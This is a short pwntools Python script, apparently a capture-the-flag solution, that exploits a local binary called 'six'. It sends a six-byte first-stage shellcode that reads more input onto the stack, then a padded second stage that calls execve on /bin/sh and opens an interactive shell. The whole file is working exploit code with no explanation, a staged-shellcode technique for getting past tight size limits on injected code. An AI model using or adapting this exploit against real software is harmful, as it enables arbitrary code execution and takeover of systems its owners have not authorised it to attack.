from pwn import *
import sys
context.log_level = 'debug'

p = process("./six")
#p = process("./seven")

if __name__=='__main__':

	p.recvuntil("shellcode:")
#	shellcode = "\x20\x30\x40\x21\x31\x41"
	shellcode = asm('''
	push rsp
	pop rsi
	mov edx,esi
	syscall
	''',arch='amd64')
	assert(len(shellcode) < 7)
#	gdb.attach(p)
	p.send(shellcode)

	shellcode2 = asm('''
	mov eax, 0x3b
	mov rdi, rsi
	xor rsi, rsi
	xor rdx, rdx
	syscall
	''',arch='amd64')
	shellcode2 = "/bin/sh\0".ljust(0xb36,'\0') + shellcode2
#	raw_input()
	p.sendline(shellcode2)

	p.interactive()
